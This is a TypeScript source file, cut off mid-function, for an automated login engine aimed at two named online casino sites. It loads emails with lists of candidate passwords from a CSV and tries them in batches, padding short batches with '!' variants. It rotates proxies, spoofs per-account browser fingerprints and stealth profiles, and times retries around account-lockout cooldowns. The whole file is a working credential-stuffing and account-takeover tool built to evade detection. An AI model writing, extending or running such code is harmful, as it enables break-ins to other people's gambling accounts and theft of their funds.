/**
 * AUTOMATION ENGINE
 * EventEmitter-based core that processes each CSV row through Browserbase.
 * Emits real-time events for the GUI server to relay over WebSocket.
 *
 * Login flow: smart response detection with multi-password retry sequences.
 * Response-based waits (networkidle + 500ms) instead of hardcoded timers.
 */

import { EventEmitter } from "events";
import Browserbase from "@browserbasehq/sdk";
import { type Page } from "playwright-core";
import * as crypto from "crypto";
import * as fs from "fs";
import * as path from "path";
import { applyStealth } from "./stealth.js";
import { createSession, BACKEND, PROXY_INFO, getProxyPoolSize, type SessionHandle } from "./cloak-backend.js";
import { profilePool } from "./manager-pool.js";
import { healthMonitor } from "./manager-health.js";
import { metricsCollector, type ManagerMetrics } from "./manager-metrics.js";
import { getManagerConfig } from "./manager-config.js";
import { gracefulShutdown, registerShutdownHandlers } from "./manager-shutdown.js";

// ─── Types ────────────────────────────────────────────────────────────────────

export interface Credential {
  email: string;
  passwords: string[];  // All passwords from CSV columns in order (B, C, D, E, F, G, ...)
}

export interface SiteConfig {
  name: string;
  url: string;
  selectors: {
    username: string;
    password: string;
    submit: string;
  };
}

export type Outcome =
  | "queued"
  | "testing"
  | "success"        // Login flow completed — no "incorrect" detected
  | "noaccount"      // All password attempts returned "incorrect"
  | "permdisabled"   // "been disabled" detected — permanent
  | "tempdisabled"   // "temporarily disabled" — 1hr cooldown
  | "N/A";           // Session/page crash

export interface SiteStatus {
  outcome: Outcome;
  attempts: number;
  error?: string;
}

export interface RowStatus {
  rowIndex: number;
  email: string;
  status: "queued" | "testing" | "done" | "skipped";
  sites: { [siteName: string]: SiteStatus };
  sessionId?: string;
  recordingUrl?: string;
  currentBatch: number;            // which batch of 3 passwords (0-indexed)
  scheduledRetestAt?: string;      // ISO timestamp — retest with next batch after cooldown
  tempDisabledUntil?: string;      // ISO timestamp — skip until this time
}

export interface EngineConfig {
  apiKey: string;
  projectId: string;
  concurrency: number;
  maxRetries: number;
  targets: SiteConfig[];
  resume?: boolean;             // load progress.json on start; skip already-completed rows
}

// ─── Custom Errors ────────────────────────────────────────────────────────────

class PermDisabledError extends Error {
  constructor() {
    super("Account permanently disabled");
    this.name = "PermDisabledError";
  }
}

class TempDisabledError extends Error {
  constructor() {
    super("Account temporarily disabled — 1hr cooldown");
    this.name = "TempDisabledError";
  }
}

// ─── Response Types ───────────────────────────────────────────────────────────

type LoginResponse = "success" | "incorrect" | "disabled" | "tempdisabled" | "other" | "timeout";

// Proxy/network failure detection — these errors indicate the proxy/session is
// unusable, not that the login flow itself failed. Bubble them to the outer
// proxy-retry loop instead of marking the site N/A.
function isProxyOrNetworkError(err: any): boolean {
  const msg = (err?.message || String(err || "")).toLowerCase();
  return (
    msg.includes("net::err_aborted") ||
    msg.includes("net::err_connection_") ||
    msg.includes("net::err_tunnel_connection_failed") ||
    msg.includes("net::err_proxy_connection_failed") ||
    msg.includes("net::err_proxy_") ||
    msg.includes("net::err_timed_out") ||
    msg.includes("net::err_socket_") ||
    msg.includes("net::err_empty_response") ||
    msg.includes("net::err_name_not_resolved") ||
    msg.includes("net::err_ssl_") ||
    msg.includes("net::err_cert_") ||
    msg.includes("target page, context or browser has been closed") ||
    msg.includes("browser has been closed") ||
    msg.includes("websocket") && msg.includes("closed")
  );
}

// Success indicator: this CSS class appears in an alert when login succeeds.
// Combined with URL change away from /login, it's the primary success signal.
const SUCCESS_SELECTOR = ".ol-alert__content--status_success";

// Per-row proxy retry: how many fresh proxies to try before giving up the row.
const MAX_PROXY_RETRIES = 3;

// Resume-support checkpoint file (written after every row).
const PROGRESS_FILE = "progress.json";

// ─── Default Targets ──────────────────────────────────────────────────────────

export const DEFAULT_TARGETS: SiteConfig[] = [
  {
    name: "joe",
    url: "https://www.joefortunepokies.win/login",
    selectors: {
      username: "#username",
      password: "#password",
      submit: "#loginSubmit",
    },
  },
  {
    name: "ignition",
    url: "https://www.ignitioncasino.ooo/login",
    selectors: {
      username: "#username",
      password: "#password",
      submit: "#loginSubmit",
    },
  },
];

// Concurrency policy: default 3, absolute max 5 (× 2 sites = 10 max sessions)
const DEFAULT_CONCURRENCY = 3;
const MAX_CONCURRENT_CREDENTIALS = 5;

// Dynamic concurrency tuning
const WARMUP_ROWS = 5;                 // process this many rows at concurrency=1 before ramping up
const FAILURE_WINDOW = 10;             // look at last N completed rows to gauge failure rate
const FAILURE_THROTTLE_THRESHOLD = 0.5;  // throttle back to 1 if failure rate exceeds this
const FAILURE_RAMPUP_THRESHOLD = 0.3;    // ramp to target only if failure rate stays below this

/** Derive a deterministic 5-digit fingerprint seed from an account email
 *  so the same account always presents the same hardware fingerprint. */
function emailToSeed(email: string): number {
  const hash = crypto.createHash("sha256").update(email.trim().toLowerCase()).digest("hex");
  // 5 hex chars → 0..1048575, scale into 10000..99999 range cloak expects
  return (parseInt(hash.slice(0, 5), 16) % 89999) + 10000;
}

/** Dynamic-resize semaphore. pLimit can't change its concurrency mid-run; this can. */
class DynamicLimit {
  private active = 0;
  private waiters: Array<() => void> = [];
  private _max: number;

  constructor(initial: number) {
    this._max = Math.max(1, initial);
  }

  get max(): number { return this._max; }
  get activeCount(): number { return this.active; }

  setMax(n: number): void {
    this._max = Math.max(1, n);
    this.drain();
  }

  async acquire(): Promise<() => void> {
    if (this.active < this._max) {
      this.active++;
      return () => this.release();
    }
    return new Promise<() => void>((resolve) => {
      this.waiters.push(() => {
        this.active++;
        resolve(() => this.release());
      });
    });
  }

  private release(): void {
    this.active--;
    this.drain();
  }

  private drain(): void {
    while (this.active < this._max && this.waiters.length > 0) {
      const w = this.waiters.shift()!;
      w();
    }
  }
}

// ─── Engine ───────────────────────────────────────────────────────────────────

export class AutomationEngine extends EventEmitter {
  private running = false;
  private shouldStop = false;
  private rows: RowStatus[] = [];

  get isRunning(): boolean {
    return this.running;
  }

  get rowStatuses(): RowStatus[] {
    return this.rows;
  }

  /** Parse credentials.csv into credential objects — reads ALL password columns dynamically */
  loadCredentials(csvPath: string): Credential[] {
    if (!fs.existsSync(csvPath)) return [];
    const content = fs.readFileSync(csvPath, "utf-8");
    const lines = content
      .split(/\r?\n/)
      .map((l) => l.trim())
      .filter((l) => l.length > 0);

    if (lines.length < 2) return [];

    const headers = lines[0].split(",").map((h) => h.trim().toLowerCase());
    const emailIdx = headers.indexOf("email");
    if (emailIdx < 0) return [];

    // Find all password columns in order: password, password2, password3, password4, ...
    const passwordIndices: number[] = [];
    for (let i = 0; i < headers.length; i++) {
      if (headers[i].startsWith("password")) {
        passwordIndices.push(i);
      }
    }
    // Sort by column number (password=1, password2=2, password3=3, ...)
    passwordIndices.sort((a, b) => {
      const numA = parseInt(headers[a].replace("password", "") || "1");
      const numB = parseInt(headers[b].replace("password", "") || "1");
      return numA - numB;
    });
    if (passwordIndices.length === 0) return [];

    const results: Credential[] = [];
    for (let i = 1; i < lines.length; i++) {
      const parts = this.parseCsvLine(lines[i]);
      const email = (parts[emailIdx] || "").trim();
      const allPasswords = passwordIndices.map((idx) => (parts[idx] || "").trim());
      // Trim trailing empty passwords but preserve internal order
      while (allPasswords.length > 0 && allPasswords[allPasswords.length - 1] === "") {
        allPasswords.pop();
      }
      if (email && allPasswords.length > 0) {
        results.push({ email, passwords: allPasswords });
      } else {
        console.warn(`[CSV] Row ${i + 1} skipped — missing ${!email ? "email" : "password"}`);
      }
    }
    return results;
  }

  /** Start the automation loop over all credentials */
  async start(credentials: Credential[], config: EngineConfig): Promise<void> {
    if (this.running) {
      this.log("WARN", "Engine is already running");
      return;
    }

    this.running = true;
    this.shouldStop = false;
    const { targets } = config;

    // Initialise row statuses (or restore from checkpoint if resuming)
    this.rows = credentials.map((c, i) => ({
      rowIndex: i,
      email: c.email,
      status: "queued" as const,
      currentBatch: 0,
      sites: Object.fromEntries(
        targets.map((t) => [t.name, { outcome: "queued" as Outcome, attempts: 0 }])
      ),
    }));

    let resumedCount = 0;
    if (config.resume) {
      resumedCount = this.loadProgress(targets);
      if (resumedCount > 0) {
        this.log("INFO", `▶ Resume: ${resumedCount}/${credentials.length} rows restored from ${PROGRESS_FILE}`);
      }
    }

    this.emit("started", {
      total: credentials.length,
      targets: targets.map((t) => t.name),
    });

    // Clamp target concurrency: default 3, absolute max 5 — never exceeded
    const targetConcurrency = Math.min(Math.max(config.concurrency || DEFAULT_CONCURRENCY, 1), MAX_CONCURRENT_CREDENTIALS);
    this.log("INFO", `Starting automation: ${credentials.length} credentials × ${targets.length} targets`);
    this.log("INFO", `Concurrency: dynamic (start=1, target=${targetConcurrency}, warmup=${WARMUP_ROWS} rows) | Response-based waits`);

    // Browserbase backend uses the cloud API; cloak backend runs locally and skips it.
    const bb: Browserbase | null = BACKEND === "browserbase"
      ? new Browserbase({ apiKey: config.apiKey })
      : null;
    if (BACKEND === "cloak") {
      this.log("INFO", `Backend: cloak (local CloakBrowser) | proxy: ${PROXY_INFO}`);

      // Initialize manager integrations (pooling, health checks, metrics, shutdown)
      try {
        const managerCfg = getManagerConfig();
        this.log("INFO", `CloakBrowser Manager: ${managerCfg.url}`);

        if (managerCfg.enableHealthMonitor) {
          healthMonitor.start();
          healthMonitor.on("profile-unhealthy", (evt) => {
            this.log("WARN", `⚠ Profile ${evt.profileId} unhealthy — auto-recovery recommended`);
          });
          this.log("INFO", "Manager health monitor started");
        }

        if (managerCfg.enableMetrics) {
          metricsCollector.on("connection-recorded", (evt) => {
            metricsCollector.recordConnection(evt.timeMs, evt.healthy);
          });
          this.log("INFO", "Manager metrics collection enabled");
        }

        registerShutdownHandlers();
        this.log("INFO", "Graceful shutdown handlers registered");
      } catch (err: any) {
        this.log("WARN", `Manager integration setup failed: ${err.message}`);
      }
    }

    // Dynamic concurrency limiter — starts at 1, ramps up after WARMUP_ROWS if success rate holds
    const limit = new DynamicLimit(1);
    const recentOutcomes: boolean[] = [];   // true = success-ish, false = N/A/error (sliding window)
    let completedRows = 0;

    const recordRowOutcome = (rowSucceeded: boolean) => {
      completedRows++;
      recentOutcomes.push(rowSucceeded);
      if (recentOutcomes.length > FAILURE_WINDOW) recentOutcomes.shift();
      const failureRate = recentOutcomes.length > 0
        ? recentOutcomes.filter((o) => !o).length / recentOutcomes.length
        : 0;
      const prevMax = limit.max;
      let nextMax = prevMax;
      if (completedRows < WARMUP_ROWS) {
        nextMax = 1;
      } else if (failureRate > FAILURE_THROTTLE_THRESHOLD) {
        nextMax = 1;  // throttle hard
      } else if (failureRate <= FAILURE_RAMPUP_THRESHOLD) {
        nextMax = targetConcurrency;
      }
      if (nextMax !== prevMax) {
        limit.setMax(nextMax);
        this.log("INFO", `⚙ Concurrency adjusted ${prevMax} → ${nextMax} (failure rate ${(failureRate * 100).toFixed(0)}% over last ${recentOutcomes.length})`);
      }
    };

    let batchSlot = 0;

    // Kill any stale sessions from previous runs (browserbase only)
    if (bb) await this.cleanupStaleSessions(bb, config.projectId);

    const tasks = credentials.map((cred, idx) => (async () => {
      // Skip rows that were already completed in a prior run (resume path)
      if (this.isRowAlreadyDone(idx)) {
        return;
      }

      const release = await limit.acquire();
      let rowSucceededForStats = true;  // tracked for dynamic concurrency adjustments
      try {
        if (this.shouldStop) {
          this.rows[idx].status = "skipped";
          for (const t of targets) this.rows[idx].sites[t.name].outcome = "N/A";
          this.emitRowUpdate(idx);
          return;
        }

        // Check tempdisabled cooldown
        if (this.rows[idx].tempDisabledUntil) {
          const until = new Date(this.rows[idx].tempDisabledUntil!).getTime();
          if (Date.now() < until) {
            this.rows[idx].status = "skipped";
            for (const t of targets) {
              this.rows[idx].sites[t.name].outcome = "tempdisabled";
            }
            this.log("WARN", `  Skipping ${cred.email} — tempdisabled until ${this.rows[idx].tempDisabledUntil}`);
            this.emitRowUpdate(idx);
            return;
          }
        }

        // Stagger session creation to avoid concurrent limit bursts
        const slot = batchSlot++;
        if (slot > 0) {
          const staggerMs = 2000 * (slot % Math.max(limit.max, 1));
          if (staggerMs > 0) {
            this.log("INFO", `  Stagger wait ${(staggerMs / 1000).toFixed(0)}s for slot ${slot}`);
            await this.sleep(staggerMs);
          }
        }

        // Mark row as testing
        this.rows[idx].status = "testing";
        this.emitRowUpdate(idx);
        this.log("INFO", `── Row ${idx + 1}/${credentials.length}: ${cred.email}`);

        // Per-account deterministic fingerprint seed (cloak only) — same hardware every time
        const seed = BACKEND === "cloak" ? emailToSeed(cred.email) : undefined;
        const triedProxies: string[] = [];
        let credentialDisabled = false;
        let lastError: any = null;

        // ── Per-row proxy retry loop ──
        // Retries on session creation failure (proxy CONNECT fail, TLS RST, etc).
        // Real login outcomes (incorrect/disabled/etc) do NOT trigger a retry.
        for (let proxyAttempt = 1; proxyAttempt <= MAX_PROXY_RETRIES; proxyAttempt++) {
          let handle: SessionHandle | null = null;

          if (proxyAttempt > 1) {
            // Reset N/A site outcomes so the new proxy gets a clean slate
            for (const t of targets) {
              const s = this.rows[idx].sites[t.name];
              if (s.outcome === "N/A" || s.outcome === "testing") {
                s.outcome = "queued";
                s.error = undefined;
              }
            }
            this.log("WARN", `  ↻ Proxy retry ${proxyAttempt}/${MAX_PROXY_RETRIES} (excluding ${triedProxies.length} prior)`);
          }

          try {
            handle = await createSession({
              bb: bb || undefined,
              projectId: config.projectId,
              // Browserbase needs an explicit viewport; cloak lets the
              // per-credential resolution profile drive it (Phase-2).
              viewport: BACKEND === "browserbase" ? { width: 1920, height: 1080 } : undefined,
              slowMo: 100,
              fingerprintSeed: seed,
              excludeProxies: triedProxies,
              email: BACKEND === "cloak" ? cred.email : undefined,
            });
            if (handle.proxyUsed) triedProxies.push(handle.proxyUsed);

            this.rows[idx].sessionId = handle.sessionId;
            this.rows[idx].recordingUrl = handle.recordingUrl;
            const seedTag = handle.fingerprintSeed != null ? ` seed=${handle.fingerprintSeed}` : "";
            this.log("INFO", `  Session: ${handle.sessionId}${seedTag}`);
            if (handle.hardwareProfile) {
              const hp = handle.hardwareProfile;
              this.log("INFO", `  Hardware: ${hp.cores}c / ${hp.memory}GB / ${hp.gpu.vendor} ${hp.gpu.renderer}`);
            }
            if (handle.geoProfile) {
              const gp = handle.geoProfile;
              this.log("INFO", `  Geo: ${gp.countryCode} (${gp.timezone} / ${gp.locale})`);
            }
            if (handle.uaProfile) {
              const ua = handle.uaProfile;
              this.log("INFO", `  UA: Chrome ${ua.chromeMajor} on ${ua.windowsLabel} (${ua.windowsVersion})`);
            }
            if (handle.resolutionProfile) {
              const r = handle.resolutionProfile;
              this.log("INFO", `  Resolution: ${r.width}x${r.height} (${r.label})`);
            }
            if (handle.fontProfile) {
              const fp = handle.fontProfile;
              this.log("INFO", `  Fonts: ${fp.name} (${fp.fonts.length} fonts)`);
            }
            if (handle.interactionProfile) {
              const ip = handle.interactionProfile;
              this.log("INFO", `  Interaction: ${ip.name} (mouse=${ip.mouseSpeed}, type=${ip.typingSpeed}, kbd=${ip.keystrokeDelayMs}ms)`);
            }
            if (handle.extensionProfile) {
              const ex = handle.extensionProfile;
              const names = ex.extensions.map((e) => e.name).join(", ");
              this.log("INFO", `  Extensions: ${ex.extensions.length} (${names})`);
            }
            if (handle.cacheProfile) {
              const cp = handle.cacheProfile;
              this.log("INFO", `  Cache: last_visit ${cp.lastVisitDaysAgo}d ago, sw=${cp.serviceWorkerHint}`);
            }

            const page: Page = handle.page;
            page.setDefaultTimeout(30000);

            // CloakBrowser ships native C++ patches — layering JS-Proxy stealth on top
            // raises the tampering signal. Only apply for browserbase backend.
            if (BACKEND !== "cloak") {
              const stealthProfile = await applyStealth(page);
              this.log("INFO", `  Stealth: Chrome ${stealthProfile.major} / ${stealthProfile.cores}c / ${stealthProfile.memory}GB`);
            } else {
              this.log("INFO", `  Stealth: cloakbrowser native (C++ patches)`);
            }

            await page.addStyleTag({ content: '* { transition: none !important; animation: none !important; scroll-behavior: auto !important; }' });

            // Process each target site SEQUENTIALLY (skip ones that already have a real outcome)
            for (const target of targets) {
              if (this.shouldStop || credentialDisabled) break;
              const sStatus = this.rows[idx].sites[target.name];
              if (sStatus.outcome !== "queued" && sStatus.outcome !== "testing") continue;

              sStatus.outcome = "testing";
              this.emitRowUpdate(idx);
              this.log("INFO", `  ${target.name}: starting login flow...`);

              try {
                const result = await this.executeLoginFlow(page, target, cred, this.rows[idx].currentBatch);
                sStatus.outcome = result.outcome;
                sStatus.attempts = result.attempts;
                this.log(
                  result.outcome === "success" ? "OK" : "WARN",
                  `  → ${target.name}: ${result.outcome} (${result.attempts} attempt${result.attempts !== 1 ? "s" : ""})`
                );

                if (result.outcome === "permdisabled") {
                  credentialDisabled = true;
                  for (const t of targets) {
                    const ss = this.rows[idx].sites[t.name];
                    if (ss.outcome === "queued" || ss.outcome === "testing") ss.outcome = "permdisabled";
                  }
                  this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED — skipping all sites`);
                } else if (result.outcome === "tempdisabled") {
                  credentialDisabled = true;
                  this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
                  this.rows[idx].currentBatch++;
                  for (const t of targets) {
                    const ss = this.rows[idx].sites[t.name];
                    if (ss.outcome === "queued" || ss.outcome === "testing") ss.outcome = "tempdisabled";
                  }
                  this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
                }
              } catch (e: any) {
                const errMsg = e.message || String(e);
                if (e instanceof PermDisabledError) {
                  sStatus.outcome = "permdisabled";
                  credentialDisabled = true;
                  for (const t of targets) {
                    const ss = this.rows[idx].sites[t.name];
                    if (ss.outcome === "queued" || ss.outcome === "testing") ss.outcome = "permdisabled";
                  }
                  this.log("ERR", `  🚫 ${cred.email}: PERMANENTLY DISABLED`);
                } else if (e instanceof TempDisabledError) {
                  sStatus.outcome = "tempdisabled";
                  credentialDisabled = true;
                  this.rows[idx].tempDisabledUntil = new Date(Date.now() + 60 * 60 * 1000).toISOString();
                  this.rows[idx].currentBatch++;
                  for (const t of targets) {
                    const ss = this.rows[idx].sites[t.name];
                    if (ss.outcome === "queued" || ss.outcome === "testing") ss.outcome = "tempdisabled";
                  }
                  this.log("WARN", `  ⏳ ${cred.email}: TEMPORARILY DISABLED — 1hr cooldown (next batch: ${this.rows[idx].currentBatch})`);
                } else if (isProxyOrNetworkError(e)) {
                  // Proxy/session failure mid-flight — bubble to outer retry loop
                  // so a fresh sticky session is tried before giving up.
                  this.log("WARN", `  ⚠ ${target.name}: proxy/network error — bubbling to retry: ${errMsg.substring(0, 100)}`);
                  throw e;
                } else {
                  sStatus.outcome = "N/A";
                  sStatus.error = errMsg;
                  this.log("ERR", `  ✗ ${target.name}: ${errMsg.substring(0, 100)}`);
                }
              }
              this.emitRowUpdate(idx);
            }

            await handle.close().catch(() => { });
            handle = null;
            if (bb && this.rows[idx].sessionId) {
              await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
            }
            this.log("INFO", `  Session closed: ${this.rows[idx].sessionId}`);
            // Session ran cleanly — no need to retry the proxy
            lastError = null;
            break;
          } catch (e: any) {
            lastError = e;
            this.log("ERR", `  Session error (proxy attempt ${proxyAttempt}): ${(e.message || String(e)).substring(0, 120)}`);
            if (handle) await handle.close().catch(() => { });
            if (bb && this.rows[idx].sessionId) {
              await bb.sessions.update(this.rows[idx].sessionId!, { status: "REQUEST_RELEASE" }).catch(() => { });
            }
            // Try another proxy if pool has more candidates and we have retries left
            const poolHasMore = getProxyPoolSize() === 0 || getProxyPoolSize() > triedProxies.length;
            if (proxyAttempt < MAX_PROXY_RETRIES && poolHasMore) {
              await this.sleep(1000);
              continue;
            }
            // Out of retries — mark unfilled sites as N/A
            for (const target of targets) {
              const s = this.rows[idx].sites[target.name];
              if (s.outcome === "queued" || s.outcome === "testing") {
                s.outcome = "N/A";
                s.error = e.message || String(e);
              }
            }
          }
        }

        this.rows[idx].status = "done";
        this.emitRowUpdate(idx);

        // Track success for dynamic concurrency: row counts as a failure if every
        // site ended in N/A AND we exhausted proxy retries with an error.
        const allNA = targets.every((t) => this.rows[idx].sites[t.name].outcome === "N/A");
        rowSucceededForStats = !(allNA && lastError != null);

        // Persist incremental results + checkpoint (resume support)
        this.writeRowResultCSV(targets, this.rows[idx], idx === 0 && !config.resume);
        this.saveProgress();
      } finally {
        release();
        recordRowOutcome(rowSucceededForStats);
      }
    })());

    await Promise.allSettled(tasks);

    // Final complete CSV (overwrite incremental with clean version)
    this.writeResultsCSV(targets);

    // Graceful shutdown: drain pool, stop health monitor, cleanup profiles
    if (BACKEND === "cloak") {
      try {
        const shutdownResult = await gracefulShutdown(30_000);
        this.log("INFO", `Graceful shutdown: ${shutdownResult.message}`);

        // Emit final metrics
        if (metricsCollector) {
          const metrics = metricsCollector.collect();
          this.log("INFO", `Final metrics: ${metrics.profilesRunning}/${metrics.profilesTotal} profiles, ${metrics.failureRate.toFixed(2)}% failure rate`);
          this.emit("metrics", metrics);
        }
      } catch (err: any) {
        this.log("WARN", `Shutdown error: ${err.message}`);
      }
    }

    this.running = false;
    this.emit("complete", { rows: this.rows });
    this.log("INFO", "═══ Automation complete ═══");
  }

  /** Gracefully stop the engine after current tasks finish */
  stop(): void {
    if (!this.running) return;
    this.shouldStop = true;
    this.log("WARN", "Stop requested — finishing active sessions...");
    this.emit("stopping");
  }

  // ─── Private ──────────────────────────────────────────────────────────────

  /** Kill all running sessions from previous runs to free up concurrent slots */
  private async cleanupStaleSessions(bb: Browserbase, projectId: string): Promise<void> {
    try {
      this.log("INFO", "Cleaning up stale sessions...");
      const timeoutPromise = this.sleep(15000).then(() => { throw new Error("Cleanup timed out after 15s"); });
      const cleanupPromise = (async () => {
        const sessions = await bb.sessions.list({ status: "RUNNING" });
        const stale: string[] = [];
        let totalSeen = 0;
        for await (const session of sessions) {
          totalSeen++;
          if (session.projectId === projectId) {
            stale.push(session.id);
          }
        }
        this.log("INFO", `Scanned ${totalSeen} running session(s), ${stale.length} match this project`);
        if (stale.length === 0) {
          this.log("INFO", "No stale sessions found");
          return;
        }
        this.log("WARN", `Found ${stale.length} stale session(s) — releasing...`);
        for (const id of stale) {
          await bb.sessions.update(id, { status: "REQUEST_RELEASE" }).catch(() => { });
        }
        await this.sleep(3000);
        this.log("INFO", `Cleaned up ${stale.length} stale session(s)`);
      })();
      await Promise.race([cleanupPromise, timeoutPromise]);
    } catch (e: any) {
      this.log("WARN", `Session cleanup failed: ${(e.message || String(e)).substring(0, 80)}`);
    }
  }

  /**
   * Build the password attempt sequence for a given batch.
   * Each batch uses 3 passwords from the credential's password list.
   * Batch 0: passwords[0..2], Batch 1: passwords[3..5], Batch 2: passwords[6..8], etc.
   * Incomplete batches padded with !/?!! on the last available password.
   * 4th attempt is always a re-press of the 3rd (buffer for tempdisabled trigger).
   * Returns empty array if no passwords available for this batch.
   */
  private buildPasswordSequence(passwords: string[], batchIndex: number): string[] {
    const startIdx = batchIndex * 3;
    const raw = passwords.slice(startIdx, startIdx + 3).filter((p) => p.length > 0);
    if (raw.length === 0) return []; // no more passwords for this batch

    // Pad to 3 using ! and !! suffixes on the last available password
    const batch = [...raw];
    while (batch.length < 3) {
      const lastPw = raw[raw.length - 1];
      batch.push(lastPw + (batch.length === raw.length ? "!" : "!!"));
    }

    // 4th attempt = re-press of 3rd (buffer for tempdisabled trigger)
    return [...batch, batch[2]];
  }

  /**
   * Wait for the site to respond after a login button press.
   * Watches for page content changes, waits for networkidle + 500ms.
   * Returns the detected response type.
   *
   * Success is detected via: (a) the .ol-alert__content--status_success
   * selector appearing in the DOM, (b) the URL navigating away from the
   * /login path (post-login redirect), or (c) the login form vanishing
   * (submit button + password field both gone — site replaced the form
   * with post-login content even without a URL change).
   */
  private async waitForLoginResponse(
    page: Page,
    timeoutMs: number = 15000,
    loginUrl?: string,
    submitSelector?: string,
    passwordSelector?: string,
  ): Promise<LoginResponse> {
    try {
      // Wait for DOM to load (avoids networkidle which can hang on infinite websockets)
      await page.waitForLoadState("domcontentloaded", { timeout: timeoutMs });
    } catch {
      // Timeout waiting for load — treat as timeout
      return "timeout";
    }

    // Extra 500ms for late-loading DOM updates
    await this.sleep(500);

    // URL-change success check (post-login redirect away from /login)
    try {
      const currentUrl = page.url();
      if (loginUrl && this.isUrlChangedAwayFromLogin(loginUrl, currentUrl)) {
        this.log("INFO", `  → url-change success: ${loginUrl} → ${currentUrl}`);
        return "success";
      }
    } catch { /* page closed mid-check */ }

    // Read page content and check for known response phrases in-browser (faster than page.content())
    const evalResponse = async (): Promise<LoginResponse> => {
      return await page.evaluate(
        ({ selector, submitSel, passwordSel }: { selector: string, submitSel: string, passwordSel: string }) => {
          if (document.querySelector(selector)) return "success";
          // Form-vanished success: both the submit button AND password field are gone
          // → site replaced the login form with post-login content (Joe Fortune pattern).
          if (submitSel && passwordSel) {
            const submitGone = !document.querySelector(submitSel);
            const passwordGone = !document.querySelector(passwordSel);
            if (submitGone && passwordGone) return "success";
          }
          const text = document.body?.innerText?.toLowerCase() || "";
          if (text.includes("been disabled")) return "disabled";
          if (text.includes("temporarily disabled")) return "tempdisabled";
          if (text.includes("incorrect")) return "incorrect";
          return "other";
        },
        { selector: SUCCESS_SELECTOR, submitSel: submitSelector || "", passwordSel: passwordSelector || "" }
      ) as LoginResponse;
    };

    try {
      let response = await evalResponse();
      // "other" recheck: a slow redirect may still be in flight after the initial wait.
      // Poll once a second for up to 5s — return early on any non-"other" verdict
      // or when the URL changes away from /login.
      if (response === "other" && loginUrl) {
        for (let i = 0; i < 5; i++) {
          await this.sleep(1000);
          if (page.isClosed()) break;
          try {
            if (this.isUrlChangedAwayFromLogin(loginUrl, page.url())) {
              this.log("INFO", `  → late url-change success after ${i + 1}s: ${page.url()}`);
              return "success";
            }
          } catch { /* page closed */ }
          const recheck = await evalResponse().catch(() => null);
          if (recheck && recheck !== "other") {
            response = recheck;
            break;
          }
        }
      }
      // Debug: surface the URL when we still couldn't classify — helps diagnose missed redirects
      if (response === "other") {
        try { this.log("INFO", `  → "other" final at URL: ${page.url()}`); } catch { /* page closed */ }
      }
      return response;
    } catch {
      return "timeout";
    }
  }

  /** True if the post-submit URL is no longer on the login page (counts as success). */
  private isUrlChangedAwayFromLogin(loginUrl: string, currentUrl: string): boolean {
    try {
      const loginPath = new URL(loginUrl).pathname.toLowerCase();
      const curUrl = new URL(currentUrl);
      const curPath = curUrl.pathname.toLowerCase();
      // Same path → no redirect; different path that doesn't contain "login" → success
      if (curPath === loginPath) return false;
      if (curPath.includes("login") || curPath.includes("signin") || curPath.includes("sign-in")) return false;
      return true;
    } catch {
      return false;
    }
  }

  /**
   * Execute the full login flow for a single site with smart password retry.
   * Returns the final outcome and attempt count for this site.
   */
  private async executeLoginFlow(
    page: Page,
    site: SiteConfig,
    cred: Credential,
    batchIndex: number = 0
  ): Promise<{ outcome: Outcome, attempts: number }> {
    // ── Network response trap: scan response bodies for disabled/incorrect phrases ──
    let networkDetection: LoginResponse | null = null;
    const responseHandler = async (response: any) => {
      try {
        const ct = (response.headers()["content-type"] || "").toLowerCase();
        if (!ct.includes("text") && !ct.includes("json") && !ct.includes("html")) return;
        const body = await response.text();
        const lower = body.toLowerCase();
        if (lower.includes("temporarily disabled")) networkDetection = "tempdisabled";
        else if (lower.includes("been disabled")) networkDetection = "disabled";
        else if (lower.includes("incorrect")) networkDetection = "incorrect";
      } catch { /* non-text response — ignore */ }
    };
    page.on("response", responseHandler);

    // ── Shadow-DOM-aware MutationObserver: install once per page, runs on every doc ──
    if (!(page as any).__casinoObserverInstalled) {
      await page.addInitScript((successSel: string) => {
        (window as any).__casinoStatus = null;
        const install = () => {
          if (!document.body) { requestAnimationFrame(install); return; }
          const findInShadows = (root: any) => {
            if (!root || (window as any).__casinoStatus) return;
            // CSS selector check — the success alert has a distinctive class
            try {
              if (root.querySelector && root.querySelector(successSel)) {
                (window as any).__casinoStatus = "success";
                return;
              }
            } catch { /* selector failed on this root */ }
            const text = (root.textContent || "").toLowerCase();
            if (text.includes("temporarily disabled")) (window as any).__casinoStatus = "tempdisabled";
            else if (text.includes("been disabled")) (window as any).__casinoStatus = "disabled";
            else if (text.includes("incorrect")) (window as any).__casinoStatus = "incorrect";
            if ((window as any).__casinoStatus) return;
            try {
              const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT);
              let node: any = walker.nextNode();
              while (node) {
                if (node.shadowRoot) findInShadows(node.shadowRoot);
                node = walker.nextNode();
              }
            } catch { /* walker failed — give up this branch */ }
          };
          const observer = new MutationObserver(() => findInShadows(document.body));
          observer.observe(document.body, { childList: true, subtree: true, characterData: true });
          findInShadows(document.body);
        };
        install();
      }, SUCCESS_SELECTOR);
      (page as any).__casinoObserverInstalled = true;
    }

    try {
      return await this.executeLoginFlowInner(page, site, cred, batchIndex, () => networkDetection, () => { networkDetection = null; });
    } finally {
      page.off("response", responseHandler);
    }
  }

  private async executeLoginFlowInner(
    page: Page,
    site: SiteConfig,
    cred: Credential,
    batchIndex: number,
    getNetworkDetection: () => LoginResponse | null,
    resetNetworkDetection: () => void
  ): Promise<{ outcome: Outcome, attempts: number }> {
    // ── Navigate to login page ──
    await page.goto(site.url, { waitUntil: "domcontentloaded", timeout: 30000 });
    await this.sleep(1000);

    // ── Dismiss cookie notices (site-specific first, then generic fallback) ──
    try {
      await page.locator('button', { hasText: /accept all/i }).first().click({ timeout: 3000 });
      this.log("INFO", `  🍪 Clicked "Accept All" cookie button`);
      await this.sleep(500);
    } catch {
      await this.dismissCookieNotice(page, site.name);
    }
    await this.sleep(500);
    await this.captureScreenshot(page, `${site.name}:page-loaded`);

    // ── Resolve selectors (configured first, auto-detect fallback) ──
    const selectors = await this.resolveSelectors(page, site);

    // ── Random Mouse Movements & Scrolling (Behavioral Emulation) ──
